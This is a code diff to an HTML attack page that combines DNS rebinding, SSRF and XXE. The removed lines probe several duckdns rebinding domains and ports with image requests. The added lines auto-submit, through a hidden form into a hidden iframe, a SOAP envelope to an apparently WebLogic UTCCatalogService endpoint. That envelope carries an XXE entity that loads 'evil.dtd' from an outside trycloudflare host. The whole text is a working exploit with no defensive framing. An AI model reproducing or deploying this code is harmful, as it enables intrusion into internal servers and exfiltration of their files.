@@ -1,26 +1,44 @@
 <script>
-  const rebinderDomains = [
-    'ssrf1.duckdns.org',
-    'ssrf2.duckdns.org',
-    'ssrf3.duckdns.org'
-  ];
-  const ports = [7001, 7002, 8001, 8003, 9001];
+  const domain = 'ssrf1.duckdns.org';
+  const port = 7001;
   const path = '/ws_utc/services/UTCCatalogService';
-  const log = document.getElementById("log");
+  const fullUrl = `http://${domain}:${port}${path}`;
 
-  for (const rebinder of rebinderDomains) {
-    for (const port of ports) {
-      const url = `http://${rebinder}:${port}${path}`;
-      const fullUrl = `${url}?r=${Math.random().toString(36).substring(2, 10)}`;  // Unique token
-      const img = new Image();
-      img.src = fullUrl;
-      img.onload = () => {
-        log.innerText += `✅ SSRF Triggered: ${fullUrl}\n`;
-      };
-      img.onerror = () => {
-        log.innerText += `❌ SSRF Blocked: ${fullUrl}\n`;
-      };
-      document.body.appendChild(img);
-    }
-  }
+  const xmlPayload = `
+  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+    <soapenv:Header/>
+    <soapenv:Body>
+      <xxe xmlns="x"><![CDATA[
+        <!DOCTYPE root [
+          <!ENTITY % xxe SYSTEM "https://okay-blood-gradually-remedy.trycloudflare.com/evil.dtd">
+          %xxe;
+        ]>
+      ]]></xxe>
+    </soapenv:Body>
+  </soapenv:Envelope>
+  `;
+
+  const form = document.createElement('form');
+  form.action = fullUrl;
+  form.method = 'POST';
+  form.enctype = 'text/xml';
+  form.target = 'hiddenFrame';
+
+  const input = document.createElement('input');
+  input.type = 'hidden';
+  input.name = 'data';
+  input.value = xmlPayload;
+  form.appendChild(input);
+
+  document.body.appendChild(form);
+
+  const iframe = document.createElement('iframe');
+  iframe.name = 'hiddenFrame';
+  iframe.style.display = 'none';
+  document.body.appendChild(iframe);
+
+  setTimeout(() => {
+    form.submit();
+    document.getElementById("log").innerText = `📡 SSRF POST fired: ${fullUrl}`;
+  }, 1000);
 </script>
